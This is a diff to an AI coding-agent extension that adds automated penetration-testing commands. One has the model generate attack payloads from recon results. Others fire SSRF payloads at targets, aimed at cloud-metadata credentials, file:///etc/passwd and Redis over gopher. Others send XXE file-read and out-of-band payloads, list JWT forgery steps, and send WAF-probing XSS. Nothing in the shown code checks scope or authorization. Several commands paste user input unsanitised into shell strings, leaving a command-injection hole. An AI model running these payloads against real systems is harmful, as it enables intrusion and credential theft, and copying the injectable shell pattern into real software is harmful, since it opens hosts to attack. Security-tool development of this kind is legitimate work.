@@ -1,6 +1,7 @@
 import type { ExtensionAPI } from "@mariozechner/pi-coding-agent";
 import { Type } from "typebox";
 import { spawn } from "child_process";
+import { randomUUID } from "crypto";
 
 // System prompt - now focused on ANALYSIS only, not execution
 const REDTEAM_SYSTEM_PROMPT = `
@@ -11,10 +12,58 @@ You are a security analyst reviewing penetration testing results. Your role is t
 - Recommend next steps based on findings
 - Document findings using the \`record_finding\` tool
 - Prioritize issues by severity
+- Generate creative attack variants when using \`generate_attack_variants\`
 
 You do NOT execute commands - the extension handles that automatically.
 Focus on analysis, interpretation, and recommendations.
+
+## Attack Variant Generation
+
+When asked to generate attack variants, think creatively about:
+- OWASP Top 10 vulnerabilities
+- Business logic flaws
+- Authentication/authorization bypasses
+- API-specific vulnerabilities (BOLA, BFLA, mass assignment)
+- Technology-specific exploits based on detected stack
+- Supply chain and third-party integration risks
+- Misconfigurations specific to the cloud provider/CDN detected
 `;
+
+// Attack variant categories for AI generation
+const ATTACK_CATEGORIES = [
+  "authentication_bypass",
+  "authorization_flaws",
+  "injection_attacks", 
+  "business_logic",
+  "api_security",
+  "file_handling",
+  "cryptographic_issues",
+  "information_disclosure",
+  "ssrf_oob",
+  "deserialization",
+  "xxe",
+  "jwt_attacks",
+  "race_conditions",
+  "cache_poisoning",
+  "subdomain_takeover",
+  "cors_misconfig",
+  "csp_bypass",
+  "prototype_pollution",
+  "graphql_attacks",
+  "websocket_attacks"
+] as const;
+
+interface AttackVariant {
+  id: string;
+  category: typeof ATTACK_CATEGORIES[number];
+  name: string;
+  description: string;
+  testCases: string[];
+  payloads: string[];
+  indicators: string[];
+  severity: Finding["severity"];
+  automated: boolean;
+}
 
 interface Finding {
   severity: "critical" | "high" | "medium" | "low" | "info";
@@ -33,6 +82,9 @@ interface EngagementState {
   findings: Finding[];
   toolsUsed: string[];
   scanResults: Record<string, string>;
+  attackVariants: AttackVariant[];
+  techStack: string[];
+  interactshUrl?: string;
 }
 
 const SEVERITY_EMOJI: Record<Finding["severity"], string> = {
@@ -91,6 +143,8 @@ export default function (pi: ExtensionAPI) {
     findings: [],
     toolsUsed: [],
     scanResults: {},
+    attackVariants: [],
+    techStack: [],
   };
 
   // Restore state on session start
@@ -848,10 +902,194 @@ Total findings: ${state.findings.length}
 - Duration: ${duration} minutes
 - Tools Used: ${state.toolsUsed.join(", ") || "None"}
 - Scans Completed: ${Object.keys(state.scanResults).join(", ") || "None"}
-- Findings: ${state.findings.length}`,
+- Findings: ${state.findings.length}
+- Attack Variants Generated: ${state.attackVariants.length}
+- Tech Stack: ${state.techStack.join(", ") || "Unknown"}`,
           },
         ],
         details: { state },
+      };
+    },
+  });
+
+  // ============================================================
+  // AI-POWERED ATTACK VARIANT GENERATION
+  // ============================================================
+
+  pi.registerTool({
+    name: "generate_attack_variants",
+    label: "Generate Attack Variants",
+    description: "Generate creative security test cases and attack variants based on target reconnaissance. Use this to brainstorm potential vulnerabilities based on detected technologies, endpoints, and configurations.",
+    promptSnippet: "Generate attack variants for the target",
+    parameters: Type.Object({
+      target: Type.String({ description: "Target domain or application" }),
+      techStack: Type.Optional(Type.Array(Type.String(), { description: "Detected technologies (e.g., React, Node.js, PostgreSQL, AWS, Cloudflare)" })),
+      endpoints: Type.Optional(Type.Array(Type.String(), { description: "Discovered API endpoints" })),
+      services: Type.Optional(Type.Array(Type.String(), { description: "Detected third-party services" })),
+      focus: Type.Optional(Type.Array(Type.String(), { description: "Specific attack categories to focus on" })),
+    }),
+    async execute(_toolCallId, params, _signal, _onUpdate, _ctx) {
+      // Store tech stack for later reference
+      if (params.techStack) {
+        state.techStack = params.techStack;
+      }
+
+      // This tool returns a prompt for the LLM to generate variants
+      const context = `
+## Target Analysis for Attack Variant Generation
+
+**Target:** ${params.target}
+**Tech Stack:** ${params.techStack?.join(", ") || "Unknown - run reconnaissance first"}
+**Discovered Endpoints:** ${params.endpoints?.join(", ") || "None discovered yet"}
+**Third-Party Services:** ${params.services?.join(", ") || "None detected"}
+**Focus Areas:** ${params.focus?.join(", ") || "All categories"}
+
+## Generate Attack Variants
+
+Based on the above context, generate comprehensive security test cases. For each variant:
+
+1. **Category**: One of: ${ATTACK_CATEGORIES.join(", ")}
+2. **Name**: Descriptive attack name
+3. **Description**: What the vulnerability is and why it might exist given the tech stack
+4. **Test Cases**: Specific tests to perform (3-5 per variant)
+5. **Payloads**: Example payloads or techniques to use
+6. **Indicators**: What to look for to confirm the vulnerability
+7. **Severity**: Expected severity if confirmed (critical/high/medium/low)
+8. **Automated**: Whether this can be tested automatically (true/false)
+
+### Technology-Specific Considerations:
+${params.techStack?.includes("React") || params.techStack?.includes("Vue") || params.techStack?.includes("Angular") ? "- Frontend SPA: Check for DOM XSS, prototype pollution, source map exposure" : ""}
+${params.techStack?.includes("Node.js") || params.techStack?.includes("Express") ? "- Node.js: Check for prototype pollution, SSRF, insecure dependencies" : ""}
+${params.techStack?.includes("GraphQL") ? "- GraphQL: Check for introspection, batching attacks, field suggestions, nested query DoS" : ""}
+${params.techStack?.includes("JWT") || params.techStack?.includes("Auth0") ? "- JWT: Check for algorithm confusion, key leakage, none algorithm, expired token acceptance" : ""}
+${params.techStack?.includes("AWS") ? "- AWS: Check for S3 misconfigs, SSRF to metadata, IAM issues, exposed credentials" : ""}
+${params.techStack?.includes("Cloudflare") ? "- Cloudflare: Check for origin bypass, cache poisoning, WAF bypass techniques" : ""}
+${params.techStack?.includes("PostgreSQL") || params.techStack?.includes("MySQL") ? "- SQL Database: Check for SQLi, error-based information disclosure" : ""}
+${params.techStack?.includes("MongoDB") ? "- MongoDB: Check for NoSQL injection, BSON injection" : ""}
+${params.techStack?.includes("Redis") ? "- Redis: Check for SSRF to Redis, cache poisoning" : ""}
+${params.techStack?.includes("Stripe") ? "- Stripe: Check for payment bypass, webhook security, idempotency issues" : ""}
+
+### API-Specific Tests (if endpoints discovered):
+${params.endpoints?.length ? `
+For these endpoints: ${params.endpoints.join(", ")}
+- Test BOLA (Broken Object Level Authorization) on resource endpoints
+- Test BFLA (Broken Function Level Authorization) on admin endpoints  
+- Test mass assignment on POST/PUT endpoints
+- Test rate limiting on authentication endpoints
+- Test parameter pollution
+- Test HTTP method override (X-HTTP-Method-Override)
+` : ""}
+
+Generate at least 10 attack variants, prioritizing those most likely to succeed given the detected stack.
+After generating, call \`save_attack_variants\` with the generated variants.
+`;
+
+      state.target = params.target;
+      pi.appendEntry("redteam-state", state);
+
+      return {
+        content: [{ type: "text", text: context }],
+        details: { target: params.target, techStack: params.techStack },
+      };
+    },
+  });
+
+  pi.registerTool({
+    name: "save_attack_variants",
+    label: "Save Attack Variants",
+    description: "Save generated attack variants to the engagement state for later testing",
+    promptSnippet: "Save attack variants",
+    parameters: Type.Object({
+      variants: Type.Array(Type.Object({
+        category: Type.String({ description: "Attack category" }),
+        name: Type.String({ description: "Attack name" }),
+        description: Type.String({ description: "Attack description" }),
+        testCases: Type.Array(Type.String(), { description: "Test cases to perform" }),
+        payloads: Type.Array(Type.String(), { description: "Example payloads" }),
+        indicators: Type.Array(Type.String(), { description: "Success indicators" }),
+        severity: Type.String({ description: "Expected severity" }),
+        automated: Type.Boolean({ description: "Can be automated" }),
+      })),
+    }),
+    async execute(_toolCallId, params, _signal, _onUpdate, _ctx) {
+      const savedVariants: AttackVariant[] = params.variants.map((v: any) => ({
+        id: randomUUID(),
+        category: v.category as typeof ATTACK_CATEGORIES[number],
+        name: v.name,
+        description: v.description,
+        testCases: v.testCases,
+        payloads: v.payloads,
+        indicators: v.indicators,
+        severity: v.severity.toLowerCase() as Finding["severity"],
+        automated: v.automated,
+      }));
+
+      state.attackVariants = [...state.attackVariants, ...savedVariants];
+      pi.appendEntry("redteam-state", state);
+
+      const summary = savedVariants
+        .map((v, i) => `${i + 1}. [${v.severity.toUpperCase()}] ${v.name} (${v.category}) - ${v.testCases.length} test cases`)
+        .join("\n");
+
+      return {
+        content: [
+          {
+            type: "text",
+            text: `✅ Saved ${savedVariants.length} attack variants:\n\n${summary}\n\nTotal variants in engagement: ${state.attackVariants.length}\n\nUse /test-variants to run automated tests or /list-variants to review.`,
+          },
+        ],
+        details: { savedVariants },
+      };
+    },
+  });
+
+  pi.registerTool({
+    name: "list_attack_variants",
+    label: "List Attack Variants",
+    description: "List all generated attack variants for the current engagement",
+    promptSnippet: "List attack variants",
+    parameters: Type.Object({
+      category: Type.Optional(Type.String({ description: "Filter by category" })),
+      automatedOnly: Type.Optional(Type.Boolean({ description: "Only show automated variants" })),
+    }),
+    async execute(_toolCallId, params, _signal, _onUpdate, _ctx) {
+      let variants = state.attackVariants;
+
+      if (params.category) {
+        variants = variants.filter(v => v.category === params.category);
+      }
+      if (params.automatedOnly) {
+        variants = variants.filter(v => v.automated);
+      }
+
+      if (variants.length === 0) {
+        return {
+          content: [{ type: "text", text: "No attack variants found. Use generate_attack_variants first." }],
+          details: {},
+        };
+      }
+
+      const report = variants.map((v, i) => `
+### ${i + 1}. ${v.name}
+**Category:** ${v.category} | **Severity:** ${SEVERITY_EMOJI[v.severity]} ${v.severity.toUpperCase()} | **Automated:** ${v.automated ? "✅" : "❌"}
+
+${v.description}
+
+**Test Cases:**
+${v.testCases.map(t => `- ${t}`).join("\n")}
+
+**Payloads:**
+\`\`\`
+${v.payloads.join("\n")}
+\`\`\`
+
+**Success Indicators:**
+${v.indicators.map(i => `- ${i}`).join("\n")}
+`).join("\n---\n");
+
+      return {
+        content: [{ type: "text", text: `# Attack Variants (${variants.length} total)\n${report}` }],
+        details: { variants },
       };
     },
   });
@@ -1552,12 +1790,1058 @@ Be thorough - match the quality of a professional security assessment report.`,
         check_tool hydra "Brute force"
         check_tool whatweb "Web fingerprinting"
         check_tool ffuf "Web fuzzer"
+        check_tool jwt_tool "JWT attacks"
+        check_tool interactsh-client "OOB testing"
+        check_tool katana "Web crawler"
+        check_tool gau "URL discovery"
+        check_tool waybackurls "Wayback URLs"
+        check_tool gitleaks "Git secrets"
+        check_tool trufflehog "Secret scanner"
+        check_tool wafw00f "WAF detection"
+        check_tool arjun "Parameter discovery"
+        check_tool sslyze "SSL analysis"
+        check_tool subjack "Subdomain takeover"
       `, 30);
 
       ctx.ui.notify("✅ Tool check complete.", "info");
 
       pi.sendUserMessage(
-        `## Red Team Tool Availability\n\n${check.output}\n\n**To install missing tools:**\n\`\`\`bash\n# Arch Linux\nyay -S subfinder httpx nuclei nmap nikto gobuster sqlmap hydra\n\n# Debian/Ubuntu/Kali\nsudo apt install nmap nikto gobuster sqlmap hydra\ngo install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest\ngo install github.com/projectdiscovery/httpx/cmd/httpx@latest\ngo install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\n\`\`\``,
+        `## Red Team Tool Availability\n\n${check.output}\n\n**To install missing tools:**\n\`\`\`bash\n# Arch Linux\nyay -S subfinder httpx nuclei nmap nikto gobuster sqlmap hydra\n\n# Debian/Ubuntu/Kali\nsudo apt install nmap nikto gobuster sqlmap hydra\ngo install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest\ngo install github.com/projectdiscovery/httpx/cmd/httpx@latest\ngo install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\ngo install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\ngo install github.com/projectdiscovery/katana/cmd/katana@latest\npip install jwt-tool wafw00f arjun sslyze\n\`\`\``,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  // ============================================================
+  // AI-DRIVEN RECONNAISSANCE WITH VARIANT GENERATION
+  // ============================================================
+
+  pi.registerCommand("analyze", {
+    description: "🧠 AI Analysis - Reconnaissance + AI-generated attack variants",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /analyze <domain>", "error");
+        return;
+      }
+
+      const target = args.trim().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+      state.target = target;
+      state.startTime = Date.now();
+      state.attackVariants = [];
+      state.techStack = [];
+      pi.appendEntry("redteam-state", state);
+
+      ctx.ui.notify(`🧠 Starting AI-driven analysis on ${target}...`, "info");
+
+      const reconResults: Record<string, string> = {};
+      const detectedTech: string[] = [];
+      const detectedEndpoints: string[] = [];
+      const detectedServices: string[] = [];
+
+      // Run quick reconnaissance in parallel
+      ctx.ui.notify("Running reconnaissance scans...", "info");
+      
+      const reconPromises = [
+        // Technology detection via whatweb
+        (async () => {
+          const whatweb = await execCommand(`whatweb -a 3 --color=never https://${target} 2>/dev/null`, 60);
+          reconResults["whatweb"] = whatweb.output;
+          // Parse technologies
+          const techMatches = whatweb.output.match(/\[([^\]]+)\]/g) || [];
+          techMatches.forEach(t => detectedTech.push(t.replace(/[\[\]]/g, "")));
+          ctx.ui.notify("✅ Technology detection complete", "info");
+        })(),
+
+        // Wappalyzer-style detection via headers and response
+        (async () => {
+          const headers = await execCommand(`curl -sI "https://${target}" 2>/dev/null`, 30);
+          reconResults["headers"] = headers.output;
+          
+          // Parse headers for tech
+          if (headers.output.toLowerCase().includes("x-powered-by: express")) detectedTech.push("Express", "Node.js");
+          if (headers.output.toLowerCase().includes("x-powered-by: php")) detectedTech.push("PHP");
+          if (headers.output.toLowerCase().includes("cloudflare")) detectedTech.push("Cloudflare");
+          if (headers.output.toLowerCase().includes("cloudfront")) detectedTech.push("CloudFront", "AWS");
+          if (headers.output.toLowerCase().includes("x-amz")) detectedTech.push("AWS");
+          if (headers.output.toLowerCase().includes("x-vercel")) detectedTech.push("Vercel", "Next.js");
+          if (headers.output.toLowerCase().includes("x-datadog")) detectedServices.push("Datadog");
+          ctx.ui.notify("✅ Header analysis complete", "info");
+        })(),
+
+        // Quick endpoint discovery on api subdomain
+        (async () => {
+          const endpoints = await execCommand(`
+            for ep in /api /api/v1 /api/v2 /graphql /health /docs /swagger /openapi.json; do
+              code=$(curl -s -o /dev/null -w "%{http_code}" "https://api.${target}$ep" --connect-timeout 3 2>/dev/null)
+              [ "$code" != "000" ] && [ "$code" != "404" ] && echo "$ep ($code)"
+            done
+          `, 60);
+          reconResults["endpoints"] = endpoints.output;
+          endpoints.output.split("\n").filter(Boolean).forEach(e => detectedEndpoints.push(e.split(" ")[0]));
+          ctx.ui.notify("✅ Endpoint discovery complete", "info");
+        })(),
+
+        // Frontend JS analysis for tech stack
+        (async () => {
+          const js = await execCommand(`
+            curl -s "https://${target}" 2>/dev/null | grep -oE 'src="[^"]+\.js[^"]*"' | head -5 | while read src; do
+              url=$(echo "$src" | cut -d'"' -f2)
+              [[ "$url" =~ ^/ ]] && url="https://${target}$url"
+              [[ "$url" =~ ^http ]] && curl -s "$url" 2>/dev/null
+            done 2>/dev/null | head -5000
+          `, 60);
+          
+          // Detect frameworks
+          if (js.output.includes("__NEXT_DATA__") || js.output.includes("next/")) detectedTech.push("Next.js", "React");
+          if (js.output.includes("__NUXT__") || js.output.includes("nuxt")) detectedTech.push("Nuxt.js", "Vue");
+          if (js.output.includes("react") || js.output.includes("React")) detectedTech.push("React");
+          if (js.output.includes("vue") || js.output.includes("Vue")) detectedTech.push("Vue");
+          if (js.output.includes("angular") || js.output.includes("ng-")) detectedTech.push("Angular");
+          if (js.output.includes("stripe") || js.output.includes("pk_live") || js.output.includes("pk_test")) {
+            detectedTech.push("Stripe");
+            detectedServices.push("Stripe");
+          }
+          if (js.output.includes("posthog") || js.output.includes("PostHog")) detectedServices.push("PostHog");
+          if (js.output.includes("intercom") || js.output.includes("Intercom")) detectedServices.push("Intercom");
+          if (js.output.includes("auth0") || js.output.includes("Auth0")) {
+            detectedTech.push("Auth0", "JWT");
+            detectedServices.push("Auth0");
+          }
+          if (js.output.includes("firebase") || js.output.includes("Firebase")) {
+            detectedTech.push("Firebase");
+            detectedServices.push("Firebase");
+          }
+          if (js.output.includes("supabase") || js.output.includes("Supabase")) {
+            detectedTech.push("Supabase", "PostgreSQL");
+            detectedServices.push("Supabase");
+          }
+          if (js.output.includes("graphql") || js.output.includes("GraphQL")) detectedTech.push("GraphQL");
+          ctx.ui.notify("✅ Frontend analysis complete", "info");
+        })(),
+
+        // DNS TXT records for service detection
+        (async () => {
+          const dns = await execCommand(`dig +short ${target} TXT 2>/dev/null`, 30);
+          reconResults["dns-txt"] = dns.output;
+          if (dns.output.includes("google-site-verification")) detectedServices.push("Google Workspace");
+          if (dns.output.includes("MS=")) detectedServices.push("Microsoft 365");
+          if (dns.output.includes("stripe")) detectedServices.push("Stripe");
+          ctx.ui.notify("✅ DNS analysis complete", "info");
+        })(),
+      ];
+
+      await Promise.all(reconPromises);
+
+      // Deduplicate
+      const uniqueTech = [...new Set(detectedTech)];
+      const uniqueEndpoints = [...new Set(detectedEndpoints)];
+      const uniqueServices = [...new Set(detectedServices)];
+
+      state.techStack = uniqueTech;
+      state.scanResults = reconResults;
+      state.toolsUsed.push("whatweb", "curl", "dig");
+      pi.appendEntry("redteam-state", state);
+
+      ctx.ui.notify("✅ Reconnaissance complete. Generating attack variants...", "info");
+
+      // Send to LLM for variant generation
+      pi.sendUserMessage(
+        `## 🧠 AI-Driven Analysis Complete - ${target}
+
+### Detected Technology Stack
+${uniqueTech.length > 0 ? uniqueTech.map(t => `- ${t}`).join("\n") : "- No specific technologies detected"}
+
+### Discovered Endpoints
+${uniqueEndpoints.length > 0 ? uniqueEndpoints.map(e => `- ${e}`).join("\n") : "- No endpoints discovered"}
+
+### Third-Party Services
+${uniqueServices.length > 0 ? uniqueServices.map(s => `- ${s}`).join("\n") : "- No third-party services detected"}
+
+### Raw Headers
+\`\`\`
+${truncateOutput(reconResults["headers"] || "", 30)}
+\`\`\`
+
+---
+
+## Your Task
+
+**Now generate attack variants using the \`generate_attack_variants\` tool with:**
+- target: "${target}"
+- techStack: ${JSON.stringify(uniqueTech)}
+- endpoints: ${JSON.stringify(uniqueEndpoints)}
+- services: ${JSON.stringify(uniqueServices)}
+
+**Then call \`save_attack_variants\` to save the generated variants.**
+
+Generate at least 15 creative attack variants based on the detected stack. Think like an attacker:
+1. What vulnerabilities are common in this tech stack?
+2. What business logic issues might exist?
+3. What misconfigurations are typical?
+4. What third-party integration risks exist?
+5. What authentication/authorization bypasses might work?`,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  // ============================================================
+  // JWT TESTING
+  // ============================================================
+
+  pi.registerCommand("jwt", {
+    description: "🔐 JWT Security Testing - Test JWT token vulnerabilities",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /jwt <token> OR /jwt <url_with_auth>", "error");
+        return;
+      }
+
+      const input = args.trim();
+      ctx.ui.notify(`🔐 Starting JWT security testing...`, "info");
+
+      let token = input;
+      if (input.startsWith("http")) {
+        // Try to extract JWT from response or ask user
+        ctx.ui.notify("Provide a JWT token directly for testing", "info");
+        return;
+      }
+
+      // Decode and analyze JWT
+      const jwtAnalysis = await execCommand(`
+        token="${token}"
+        
+        echo "=== JWT Analysis ==="
+        echo ""
+        
+        # Decode header and payload
+        header=$(echo "$token" | cut -d'.' -f1 | base64 -d 2>/dev/null || echo "$token" | cut -d'.' -f1 | base64 -di 2>/dev/null)
+        payload=$(echo "$token" | cut -d'.' -f2 | base64 -d 2>/dev/null || echo "$token" | cut -d'.' -f2 | base64 -di 2>/dev/null)
+        
+        echo "Header:"
+        echo "$header" | jq . 2>/dev/null || echo "$header"
+        echo ""
+        echo "Payload:"
+        echo "$payload" | jq . 2>/dev/null || echo "$payload"
+        echo ""
+        
+        # Check algorithm
+        alg=$(echo "$header" | jq -r '.alg' 2>/dev/null)
+        echo "Algorithm: $alg"
+        
+        # Security checks
+        echo ""
+        echo "=== Security Checks ==="
+        
+        [ "$alg" = "none" ] && echo "🔴 CRITICAL: Algorithm is 'none'!"
+        [ "$alg" = "HS256" ] && echo "🟠 WARNING: HS256 - symmetric key, potential for key brute force"
+        
+        # Check expiration
+        exp=$(echo "$payload" | jq -r '.exp' 2>/dev/null)
+        if [ -n "$exp" ] && [ "$exp" != "null" ]; then
+          now=$(date +%s)
+          if [ "$exp" -lt "$now" ]; then
+            echo "🔴 Token expired at $(date -d @$exp)"
+          else
+            echo "✅ Token expires at $(date -d @$exp)"
+          fi
+        else
+          echo "🟠 WARNING: No expiration claim"
+        fi
+        
+        # Check for sensitive data
+        echo "$payload" | grep -qiE '"password":|"secret":|"api_key":' && echo "🔴 CRITICAL: Sensitive data in payload!"
+        
+        # Check issuer
+        iss=$(echo "$payload" | jq -r '.iss' 2>/dev/null)
+        [ -n "$iss" ] && [ "$iss" != "null" ] && echo "Issuer: $iss"
+        
+        echo ""
+        echo "=== Attack Vectors ==="
+        echo "1. Try algorithm confusion: Change RS256 to HS256 and sign with public key"
+        echo "2. Try 'none' algorithm: Remove signature, set alg to 'none'"
+        echo "3. Try key brute force: Use jwt-tool or hashcat"
+        echo "4. Try expired token: Check if backend validates expiration"
+        echo "5. Try modified claims: Change user ID, role, email"
+      `, 30);
+
+      state.toolsUsed.push("jwt-analysis");
+      state.scanResults["jwt"] = jwtAnalysis.output;
+      pi.appendEntry("redteam-state", state);
+
+      ctx.ui.notify("✅ JWT analysis complete.", "info");
+
+      // Try jwt_tool if available
+      const jwtToolCheck = await execCommand(`command -v jwt_tool && jwt_tool "${token}" 2>/dev/null | head -50 || echo "jwt_tool not installed"`, 30);
+
+      pi.sendUserMessage(
+        `## JWT Security Analysis
+
+\`\`\`
+${jwtAnalysis.output}
+\`\`\`
+
+### jwt_tool Output (if available)
+\`\`\`
+${truncateOutput(jwtToolCheck.output, 50)}
+\`\`\`
+
+**Analysis Tasks:**
+1. Check if the algorithm can be changed to 'none'
+2. If RS256, try algorithm confusion attack
+3. Check if expired tokens are accepted
+4. Test claim modification (user ID, roles)
+5. Use \`record_finding\` for any vulnerabilities found`,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  // ============================================================
+  // SSRF TESTING
+  // ============================================================
+
+  pi.registerCommand("ssrf", {
+    description: "🌐 SSRF Testing - Test for Server-Side Request Forgery",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /ssrf <target_url_with_param> (e.g., /ssrf 'https://api.target.com/fetch?url=')", "error");
+        return;
+      }
+
+      const target = args.trim();
+      ctx.ui.notify(`🌐 Starting SSRF testing on ${target}...`, "info");
+
+      // Start interactsh for OOB detection if available
+      let interactshUrl = state.interactshUrl;
+      if (!interactshUrl) {
+        ctx.ui.notify("Starting interactsh for OOB detection...", "info");
+        const interactsh = await execCommand(`timeout 5 interactsh-client -v 2>&1 | grep -oE '[a-z0-9]+\.interactsh\.com' | head -1 || echo ""`, 10);
+        if (interactsh.output.includes("interactsh.com")) {
+          interactshUrl = interactsh.output.trim();
+          state.interactshUrl = interactshUrl;
+          ctx.ui.notify(`OOB URL: ${interactshUrl}`, "info");
+        }
+      }
+
+      // SSRF payloads
+      const ssrfPayloads = [
+        // Cloud metadata
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://100.100.100.200/latest/meta-data/",
+        // Internal services
+        "http://localhost:80/",
+        "http://localhost:8080/",
+        "http://127.0.0.1:6379/",
+        "http://127.0.0.1:11211/",
+        // Bypass attempts
+        "http://0.0.0.0/",
+        "http://[::]:80/",
+        "http://localhost%00.evil.com/",
+        "http://127.1/",
+        // Protocol smuggling
+        "file:///etc/passwd",
+        "dict://localhost:6379/info",
+        "gopher://localhost:6379/_",
+      ];
+
+      const results: string[] = [];
+      results.push("| Payload | Status | Length | Notes |");
+      results.push("|---------|--------|--------|-------|");
+
+      for (const payload of ssrfPayloads.slice(0, 10)) {
+        const encodedPayload = encodeURIComponent(payload);
+        const testUrl = target.includes("=") 
+          ? `${target}${encodedPayload}`
+          : `${target}?url=${encodedPayload}`;
+        
+        const test = await execCommand(`
+          response=$(curl -s -w "\n%{http_code} %{size_download}" "${testUrl}" --connect-timeout 5 2>/dev/null)
+          status=$(echo "$response" | tail -1 | cut -d' ' -f1)
+          size=$(echo "$response" | tail -1 | cut -d' ' -f2)
+          body=$(echo "$response" | head -n -1 | head -c 200)
+          echo "$status|$size|$body"
+        `, 10);
+
+        const [status, size, body] = test.output.split("|");
+        let notes = "";
+        if (body?.includes("ami-id") || body?.includes("instance-id")) notes = "🔴 AWS METADATA!";
+        if (body?.includes("root:") || body?.includes("/bin/bash")) notes = "🔴 FILE READ!";
+        if (body?.includes("Redis") || body?.includes("PONG")) notes = "🔴 REDIS ACCESS!";
+        if (parseInt(size || "0") > 1000) notes = notes || "⚠️ Large response";
+        
+        results.push(`| ${payload.substring(0, 40)}... | ${status || 'ERR'} | ${size || '0'} | ${notes} |`);
+      }
+
+      state.toolsUsed.push("ssrf-test");
+      state.scanResults["ssrf"] = results.join("\n");
+      pi.appendEntry("redteam-state", state);
+
+      ctx.ui.notify("✅ SSRF testing complete.", "info");
+
+      pi.sendUserMessage(
+        `## SSRF Testing Results for ${target}
+
+${results.join("\n")}
+
+${interactshUrl ? `**OOB Detection URL:** ${interactshUrl}\nUse this URL in payloads to detect blind SSRF.` : "**Note:** Install interactsh-client for blind SSRF detection."}
+
+### Additional SSRF Bypass Techniques:
+1. Use alternate IP representations: \`127.0.0.1\` → \`2130706433\` (decimal)
+2. Use URL encoding: \`http://localhost\` → \`http://%6c%6f%63%61%6c%68%6f%73%74\`
+3. Use DNS rebinding if filtering by hostname
+4. Try different protocols: \`file://\`, \`dict://\`, \`gopher://\`
+
+Use \`record_finding\` if SSRF is confirmed (typically CRITICAL severity for cloud metadata access).`,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  // ============================================================
+  // XXE TESTING
+  // ============================================================
+
+  pi.registerCommand("xxe", {
+    description: "📄 XXE Testing - Test for XML External Entity injection",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /xxe <endpoint_url>", "error");
+        return;
+      }
+
+      const target = args.trim();
+      ctx.ui.notify(`📄 Starting XXE testing on ${target}...`, "info");
+
+      const xxePayloads = [
+        // Basic XXE
+        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
+        // Parameter entity
+        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>`,
+        // OOB XXE
+        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR/xxe">]><foo>&xxe;</foo>`,
+        // CDATA exfil
+        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>`,
+      ];
+
+      const results: string[] = [];
+
+      for (const payload of xxePayloads) {
+        const test = await execCommand(`
+          response=$(curl -s -w "\n%{http_code}" -X POST "${target}" \
+            -H "Content-Type: application/xml" \
+            -H "Content-Type: text/xml" \
+            -d '${payload.replace(/'/g, "'\\''")}' \
+            --connect-timeout 10 2>/dev/null)
+          status=$(echo "$response" | tail -1)
+          body=$(echo "$response" | head -n -1)
+          echo "STATUS:$status"
+          echo "BODY:$body" | head -c 500
+        `, 15);
+
+        let status = "";
+        let indicator = "❓";
+        if (test.output.includes("root:") || test.output.includes("/bin/bash")) {
+          indicator = "🔴 FILE READ CONFIRMED!";
+        } else if (test.output.includes("STATUS:200")) {
+          indicator = "🟡 200 OK - Inspect response";
+          status = "200";
+        } else if (test.output.includes("STATUS:500")) {
+          indicator = "🟠 500 Error - Possible processing";
+        }
+
+        results.push(`**Payload:** \`${payload.substring(0, 60)}...\`\n**Result:** ${indicator}\n`);
+      }
+
+      state.toolsUsed.push("xxe-test");
+      state.scanResults["xxe"] = results.join("\n");
+      pi.appendEntry("redteam-state", state);
+
+      ctx.ui.notify("✅ XXE testing complete.", "info");
+
+      pi.sendUserMessage(
+        `## XXE Testing Results for ${target}
+
+${results.join("\n")}
+
+### XXE Exploitation Tips:
+1. If file read works, try \`/etc/shadow\`, \`/proc/self/environ\`, \`.env\` files
+2. For blind XXE, use OOB with your collaborator server
+3. Try SSRF via XXE: \`<!ENTITY xxe SYSTEM "http://internal-service/">\`
+4. For .NET targets, try \`<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\`
+
+Use \`record_finding\` if XXE is confirmed (CRITICAL severity).`,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  // ============================================================
+  // WAF DETECTION & BYPASS
+  // ============================================================
+
+  pi.registerCommand("waf", {
+    description: "🛡️ WAF Detection - Detect and fingerprint Web Application Firewalls",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /waf <target_url>", "error");
+        return;
+      }
+
+      let target = args.trim();
+      if (!target.startsWith("http")) target = `https://${target}`;
+
+      ctx.ui.notify(`🛡️ Detecting WAF on ${target}...`, "info");
+
+      // Use wafw00f if available
+      const wafw00f = await execCommand(`wafw00f "${target}" 2>/dev/null || echo "wafw00f not installed"`, 60);
+
+      // Manual WAF detection via headers and behavior
+      const manual = await execCommand(`
+        echo "=== Header-based Detection ==="
+        headers=$(curl -sI "${target}" 2>/dev/null)
+        
+        echo "$headers" | grep -i "server:" | head -1
+        echo "$headers" | grep -iE "x-cdn|x-cache|cf-ray|x-akamai|x-sucuri|x-protected" | head -5
+        
+        # Test with malicious payload
+        echo ""
+        echo "=== Behavior-based Detection ==="
+        
+        # XSS payload
+        xss_response=$(curl -s -o /dev/null -w "%{http_code}" "${target}?test=<script>alert(1)</script>" --connect-timeout 5 2>/dev/null)
+        echo "XSS payload: HTTP $xss_response"
+        
+        # SQLi payload
